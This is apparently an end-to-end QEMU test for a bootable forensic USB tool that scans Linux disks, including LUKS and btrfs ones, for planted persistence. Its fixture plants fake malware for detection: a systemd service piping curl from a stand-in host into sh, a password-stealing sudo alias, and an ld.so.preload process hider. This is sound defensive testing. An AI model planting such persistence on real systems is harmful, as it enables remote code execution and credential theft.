#!/usr/bin/env python3
"""End-to-end smoke test of the Flipper boot flow, runnable on Debian/Ubuntu.

The real image is built on Arch with mkinitcpio (flipper/build-flipper-image.sh).
This test builds an equivalent image from the host's kernel so the parts that
matter can be exercised in QEMU + OVMF (UEFI):

  * UEFI boot of a Unified Kernel Image from a GPT/FAT USB drive image
    (the same make-disk-image.sh the real build uses)
  * the guided flipper/wtf-scan script and initcpio runtime hook
  * read-only unlock/mount of LUKS, btrfs subvolumes (@, @home) and ext4
  * reports written back to the USB drive, and the scanned disks unchanged

Needs: qemu-system-x86 ovmf systemd-ukify busybox-static cryptsetup-bin lvm2
btrfs-progs e2fsprogs zstd mtools dosfstools fdisk python3-pexpect, and a
static wtf-check build (cargo build --release --target x86_64-unknown-linux-musl).
Run as root (to read the host kernel and modules):  sudo flipper/test/qemu-smoke.py
Set KEEP=1 to keep the work dir with each boot's console transcript.
"""

import hashlib
import os
import platform
import re
import shutil
import stat
import subprocess
import sys
import tempfile

import pexpect

HERE = os.path.dirname(os.path.abspath(__file__))
FLIPPER = os.path.dirname(HERE)
REPO = os.path.dirname(FLIPPER)
def _default_kver():
    running = platform.release()
    if os.path.isdir(f"/lib/modules/{running}") and os.path.exists(f"/boot/vmlinuz-{running}"):
        return running
    found = sorted(k for k in os.listdir("/lib/modules") if os.path.exists(f"/boot/vmlinuz-{k}"))
    if not found:
        sys.exit("no installed kernel with modules found (apt install linux-image-virtual)")
    return found[-1]


KVER = os.environ.get("KVER") or _default_kver()
WTF = os.path.join(REPO, "target/x86_64-unknown-linux-musl/release/wtf-check")
MODULES = ["nvme", "usb-storage", "uas", "xhci-pci", "btrfs", "dm-crypt", "xfs", "nls_iso8859-1", "nls_cp437"]
TOOLS = ["blkid", "lsblk", "blockdev", "cryptsetup", "lvm", "less", "sed", "grep", "date", "ls", "sleep", "mkfs.ext4", "mkfs.btrfs", "btrfs"]
OVMF_CODE = "/usr/share/OVMF/OVMF_CODE_4M.fd"
OVMF_VARS = "/usr/share/OVMF/OVMF_VARS_4M.fd"
PASS = "correct horse battery"


def run(*cmd, **kw):
    return subprocess.run(cmd, check=True, **kw)


def write_fixture(root):
    """A small fake Arch install with planted persistence."""
    files = {
        "etc/os-release": 'NAME="Arch Linux"\nPRETTY_NAME="Arch Linux (wtf-check test fixture)"\nID=arch\n',
        "etc/passwd": "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n",
        "etc/ld.so.preload": "/usr/local/lib/libprocesshider.so\n",
        "usr/local/lib/libprocesshider.so": "\x7fELF fake\n",
        "etc/systemd/system/evil.service": "[Service]\nExecStart=/bin/sh -c 'curl -s http://x.invalid/p | sh'\n",
        "home/alice/.bashrc": "alias sudo='read -s p; echo $p >> /tmp/.p; sudo'\n",
        "var/lib/pacman/local/ALPM_DB_VERSION": "9\n",
    }
    for rel, content in files.items():
        p = os.path.join(root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as f:
            f.write(content)
    os.makedirs(os.path.join(root, "root"), exist_ok=True)


def copy_with_libs(binary, dest_root):
    real = shutil.which(binary)
    if not real:
        sys.exit(f"missing tool on host: {binary}")
    targets = {real}
    out = subprocess.run(["ldd", real], capture_output=True, text=True).stdout
    for line in out.splitlines():
        m = re.search(r"(/\S+)", line.split("=>")[-1])
        if m:
            targets.add(m.group(1))
    for t in targets:
        d = os.path.join(dest_root, t.lstrip("/"))
        os.makedirs(os.path.dirname(d), exist_ok=True)
        shutil.copy2(os.path.realpath(t), d)
    link = os.path.join(dest_root, "usr/local/sbin", binary)
    os.makedirs(os.path.dirname(link), exist_ok=True)
    if not os.path.exists(link):
        shutil.copy2(real, link)


def add_modules(root):
    seen = set()
    for m in MODULES:
        out = subprocess.run(["modprobe", "-S", KVER, "--show-depends", m], capture_output=True, text=True).stdout
        for line in out.splitlines():
            parts = line.split()
            if parts and parts[0] == "insmod" and parts[1] not in seen:
                seen.add(parts[1])
                src = parts[1]
                dst = os.path.join(root, src.lstrip("/"))
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                if src.endswith(".zst"):
                    run("zstd", "-q", "-d", "-f", src, "-o", dst[:-4])
                elif src.endswith(".xz"):
                    run("sh", "-c", f"xz -dc '{src}' > '{dst[:-3]}'")
                else:
                    shutil.copy2(src, dst)
    for f in ["modules.builtin", "modules.builtin.modinfo", "modules.order"]:
        src = f"/lib/modules/{KVER}/{f}"
        if os.path.exists(src):
            dst = os.path.join(root, "lib/modules", KVER, f)
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copy2(src, dst)
    run("depmod", "-b", root, KVER)


def newc_cpio(root, out_path):
    """Write a newc cpio archive of `root` (no external cpio needed)."""
    ino = 1

    def entry(name, mode, data=b"", nlink=1):
        nonlocal ino
        hdr = "070701" + "".join(f"{v:08x}" for v in [ino, mode, 0, 0, nlink, 0, len(data), 0, 0, 0, 0, len(name) + 1, 0])
        ino += 1
        b = hdr.encode() + name.encode() + b"\0"
        b += b"\0" * ((4 - len(b) % 4) % 4)
        b += data + b"\0" * ((4 - len(data) % 4) % 4)
        return b

    with open(out_path, "wb") as out:
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames.sort()
            rel = os.path.relpath(dirpath, root)
            if rel != ".":
                out.write(entry(rel, stat.S_IFDIR | 0o755, nlink=2))
            for fn in sorted(filenames):
                full = os.path.join(dirpath, fn)
                name = os.path.normpath(os.path.join(rel, fn))
                st = os.lstat(full)
                if stat.S_ISLNK(st.st_mode):
                    out.write(entry(name, stat.S_IFLNK | 0o777, os.readlink(full).encode()))
                else:
                    with open(full, "rb") as f:
                        out.write(entry(name, stat.S_IFREG | (st.st_mode & 0o7777), f.read()))
        out.write(entry("TRAILER!!!", 0))


INIT = """#!/bin/busybox sh
/bin/busybox --install -s /bin
mkdir -p /proc /sys /dev /run /tmp /mnt
mount -t proc proc /proc; mount -t sysfs sys /sys; mount -t devtmpfs dev /dev; mount -t tmpfs run /run
for m in xhci-pci usb-storage uas nvme btrfs dm-crypt xfs nls_iso8859-1; do modprobe $m 2>/dev/null; done
mkdir -p /run/cryptsetup
sleep 3
. /hooks/wtfcheck
run_hook
"""


def build_image(work):
    root = os.path.join(work, "initramfs")
    os.makedirs(os.path.join(root, "bin"))
    shutil.copy2(shutil.which("busybox"), os.path.join(root, "bin/busybox"))
    os.makedirs(os.path.join(root, "usr/local/bin"))
    shutil.copy2(WTF, os.path.join(root, "usr/local/bin/wtf-check"))
    shutil.copy2(os.path.join(FLIPPER, "wtf-scan"), os.path.join(root, "usr/local/bin/wtf-scan"))
    os.makedirs(os.path.join(root, "hooks"))
    shutil.copy2(os.path.join(FLIPPER, "initcpio/hooks/wtfcheck"), os.path.join(root, "hooks/wtfcheck"))
    for t in TOOLS:
        copy_with_libs(t, root)
    for ti in ["/usr/share/terminfo/l/linux", "/lib/terminfo/l/linux"]:
        if os.path.exists(ti):
            d = os.path.join(root, "usr/share/terminfo/l/linux")
            os.makedirs(os.path.dirname(d), exist_ok=True)
            shutil.copy2(ti, d)
            break
    write_fixture(os.path.join(root, "fixture"))
    add_modules(root)
    with open(os.path.join(root, "init"), "w") as f:
        f.write(INIT)
    os.chmod(os.path.join(root, "init"), 0o755)
    cpio = os.path.join(work, "initramfs.cpio")
    newc_cpio(root, cpio)
    run("zstd", "-q", "-19", "-f", cpio, "-o", cpio + ".zst")
    efi = os.path.join(work, "BOOTX64.EFI")
    run("ukify", "build", f"--linux=/boot/vmlinuz-{KVER}", f"--initrd={cpio}.zst", "--cmdline=console=ttyS0", f"--output={efi}", stdout=subprocess.DEVNULL)
    img = os.path.join(work, "flipper.img")
    run(os.path.join(FLIPPER, "make-disk-image.sh"), efi, img, "128", stdout=subprocess.DEVNULL)
    return img


def sha(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def boot(work, img, disks, script, label):
    vars_fd = os.path.join(work, "vars.fd")
    shutil.copy2(OVMF_VARS, vars_fd)
    cmd = [
        "qemu-system-x86_64", "-machine", "q35", "-m", "1536", "-nographic", "-no-reboot",
        "-drive", f"if=pflash,format=raw,readonly=on,file={OVMF_CODE}",
        "-drive", f"if=pflash,format=raw,file={vars_fd}",
        "-device", "qemu-xhci",
        "-drive", f"if=none,id=flip,format=raw,file={img}", "-device", "usb-storage,drive=flip,bootindex=0",
    ]
    for i, d in enumerate(disks):
        cmd += ["-drive", f"if=none,id=d{i},format=raw,file={d}", "-device", f"nvme,serial=wtf{i},drive=d{i}"]
    log = open(os.path.join(work, f"console-{label}.log"), "w")
    child = pexpect.spawn(cmd[0], cmd[1:], encoding="utf-8", timeout=600, codec_errors="replace")
    child.logfile_read = log
    try:
        for expect, send in script:
            child.expect(expect)
            if isinstance(send, str) and send.startswith("PICK:"):
                # Device names aren't stable between boots: choose by the
                # filesystem type shown in wtf-scan's disk listing.
                want = send[5:]
                m = re.search(r"^\s*(\S+)\s+" + re.escape(want) + r"\s", child.before, re.M)
                if not m:
                    raise pexpect.TIMEOUT(f"no {want} disk in listing")
                send = m.group(1)
            if send is not None:
                child.sendline(send)
        child.expect(pexpect.EOF, timeout=180)
    except (pexpect.TIMEOUT, pexpect.EOF) as e:
        log.flush()
        print(f"[{label}] FAILED waiting for {expect!r}: {type(e).__name__}; see {log.name}")
        tail = open(log.name, errors="replace").read()[-3000:]
        print(tail)
        child.terminate(force=True)
        return False
    log.close()
    print(f"[{label}] boot flow completed")
    return True


def reports(work, img, label):
    out = os.path.join(work, f"reports-{label}")
    shutil.rmtree(out, ignore_errors=True)
    os.makedirs(out)
    subprocess.run(["mcopy", "-s", "-n", "-i", f"{img}@@1M", "::/reports", out], check=True)
    texts = []
    for dp, _, fns in os.walk(out):
        for fn in fns:
            if fn.endswith(".txt"):
                texts.append(open(os.path.join(dp, fn)).read())
    # Clear the reports folder for the next run.
    subprocess.run(["mdeltree", "-i", f"{img}@@1M", "::/reports"], check=True)
    subprocess.run(["mmd", "-i", f"{img}@@1M", "::/reports"], check=True)
    return "\n".join(texts)


def main():
    if not os.path.exists(WTF):
        sys.exit("build the static binary first: cargo build --release --target x86_64-unknown-linux-musl")
    work = tempfile.mkdtemp(prefix="wtf-flipper-test-")
    print(f"work dir: {work}")
    img = build_image(work)
    print(f"boot image built ({os.path.getsize(img) // 1048576} MiB)")

    # Disk 0: plain ext4 built on the host. Disks 1 and 2 are prepared in the
    # guest (LUKS and btrfs subvolumes need the kernel).
    fx = os.path.join(work, "fixture")
    write_fixture(fx)
    d0, d1, d2 = (os.path.join(work, f"disk{i}.img") for i in range(3))
    run("mkfs.ext4", "-q", "-L", "archroot", "-d", fx, d0, "64M")
    for d in (d1, d2):
        with open(d, "wb") as f:
            f.truncate(320 * 1024 * 1024)

    prompt = r"Partition name, e.g\."
    setup = (
        "set -e; E=''; for d in /dev/nvme?n1; do if [ -z \"$(blkid -o value -s TYPE $d)\" ]; then E=\"$E $d\"; fi; done; "
        "set -- $E; L=$1; B=$2; echo \"luks=$L btrfs=$B\"; "
        f"printf '%s' '{PASS}' | cryptsetup luksFormat --batch-mode --type luks2 --pbkdf pbkdf2 --pbkdf-force-iterations 1000 $L -; "
        f"printf '%s' '{PASS}' | cryptsetup open $L setup -; "
        "mkfs.ext4 -q -d /fixture /dev/mapper/setup; cryptsetup close setup; "
        "mkfs.btrfs -q -f $B; mkdir -p /tmp/b; mount $B /tmp/b; "
        "btrfs -q subvolume create /tmp/b/@; btrfs -q subvolume create /tmp/b/@home; "
        "cp -a /fixture/. /tmp/b/@/; mv /tmp/b/@/home/alice /tmp/b/@home/alice; umount /tmp/b; "
        "echo SETUP-DONE; set +e"
    )
    ok = True
    before = sha(d0)
    ok &= boot(work, img, [d0, d1, d2], [
        (prompt, "shell"),
        (r"# ", setup),
        (r"SETUP-DONE", None),
        (r"# ", "exit"),
        (prompt, "PICK:ext4"),
        (r"View the full report", "n"),
        (r"Press Enter to power off", ""),
    ], "ext4")
    r = reports(work, img, "ext4")
    for needle in ["ld.so.preload", "libprocesshider", "evil.service", "redefines `sudo`"]:
        if needle not in r:
            print(f"[ext4] report is missing {needle!r}")
            ok = False
    if sha(d0) != before:
        print("[ext4] scanned disk was MODIFIED")
        ok = False

    before = (sha(d1), sha(d2))
    ok &= boot(work, img, [d0, d1, d2], [
        (prompt, "PICK:crypto_LUKS"),
        (r"[Ee]nter passphrase", PASS),
        (r"View the full report", "n"),
        (r"Press Enter to power off", ""),
    ], "luks")
    r = reports(work, img, "luks")
    if "ld.so.preload" not in r or "Arch Linux" not in r and "evil.service" not in r:
        print("[luks] report is missing expected findings")
        ok = False

    ok &= boot(work, img, [d0, d1, d2], [
        (prompt, "PICK:btrfs"),
        (r"btrfs subvolumes: system=@ home=@home", None),
        (r"View the full report", "n"),
        (r"Press Enter to power off", ""),
    ], "btrfs")
    r = reports(work, img, "btrfs")
    for needle in ["ld.so.preload", "redefines `sudo`"]:
        if needle not in r:
            print(f"[btrfs] report is missing {needle!r} (home subvolume mounted?)")
            ok = False
    if (sha(d1), sha(d2)) != before:
        print("[luks/btrfs] scanned disks were MODIFIED")
        ok = False

    print("PASS" if ok else "FAIL")
    if ok and not os.environ.get("KEEP"):
        shutil.rmtree(work)
    elif ok:
        print(f"kept {work} (console-*.log has each boot's transcript)")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
